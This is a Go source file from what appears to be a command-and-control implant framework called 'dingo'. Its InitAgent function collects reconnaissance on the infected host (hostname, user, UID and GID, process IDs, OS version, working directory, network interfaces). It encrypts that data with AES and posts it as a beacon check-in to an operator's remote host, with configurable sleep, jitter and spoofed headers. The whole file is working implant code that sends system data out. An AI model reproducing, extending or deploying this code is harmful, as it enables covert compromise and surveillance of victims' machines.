package initialization

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"dingo/hg"
	"encoding/base64"
	"encoding/json"
	"io"
	"net"
	"net/http"
)

func GetUsername() (string, error) {
	user, err := hg.GetCurrentUser()
	if err != nil {
		return "", err
	}

	return user.Username, nil
}

func InitAgent(rhost string, rport string, uri string, sleep int, jitter int, listener string, agentid string, useragent string, key []byte, beacon_name string) error {
	url := "http://" + rhost + ":" + rport + "/" + uri

	hostname, err := hg.GetHostname()
	if err != nil {
		return err
	}

	procPath, err := hg.GetCurrentProcPath()
	if err != nil {
		return err
	}

	procName, err := hg.GetCurrentProcName()
	if err != nil {
		return err
	}

	pid := hg.GetCurrentPid()
	ppid := hg.GetCurrentPpid()

	os := hg.GetOS()
	osBuild := hg.GetOSBuild()
	osVersion := hg.GetOSVersion()

	username, err := GetUsername()
	if err != nil {
		return err
	}

	uid, err := hg.GetCurrentUid()
	if err != nil {
		return err
	}

	gid, err := hg.GetCurrentGid()
	if err != nil {
		return err
	}

	pwd, err := hg.GetPwd()
	if err != nil {
		return err
	}

	ip := hg.GetIPFromDial(rhost + ":" + rport)

	iFaces, err := net.Interfaces()
	if err != nil {
		return err
	}

	var interfaces = make(map[string]string)

	for _, iFace := range iFaces {
		addrs, err := iFace.Addrs()
		if err != nil {
			return err
		}

		interfaces[iFace.Name] = addrs[0].String()
	}

	rawJsonData := httpPostInitRequest{
		Hostname:        hostname,
		IP:              ip.String(),
		Interfaces:      interfaces,
		ProcessPath:     procPath,
		PWD:             pwd,
		ProcessName:     procName,
		ProcessID:       pid,
		ParentProcessID: ppid,
		Username:        username,
		UID:             uid,
		GID:             gid,
		OperatingSystem: os,
		OSVersion:       osVersion,
		OSBuild:         osBuild,
		Sleep:           sleep,
		Jitter:          jitter,
		Listener:        listener,
	}

	jsonData, err := json.Marshal(rawJsonData)
	if err != nil {
		return err
	}

	jsonDataEncrypted, err := EncryptString(key, string(jsonData))
	if err != nil {
		return err
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonDataEncrypted)))
	if err != nil {
		return err
	}
	req.Header.Add("AgentID", agentid)
	req.Header.Add("CallType", "Init")
	req.Header.Set("User-Agent", useragent)
	req.Header.Add("Name", beacon_name)

	_, err = client.Do(req)
	if err != nil {
		return err
	}

	return nil
}

func EncryptString(key []byte, message string) (encoded string, err error) {
	//Create byte array from the input string
	plainText := []byte(message)

	//Create a new AES cipher using the key
	block, err := aes.NewCipher(key)

	//IF NewCipher failed, exit:
	if err != nil {
		return
	}

	//Make the cipher text a byte array of size BlockSize + the length of the message
	cipherText := make([]byte, aes.BlockSize+len(plainText))

	//iv is the ciphertext up to the blocksize (16)
	iv := cipherText[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		return
	}

	//Encrypt the data:
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)

	//Return string encoded in base64
	return base64.RawStdEncoding.EncodeToString(cipherText), err
}
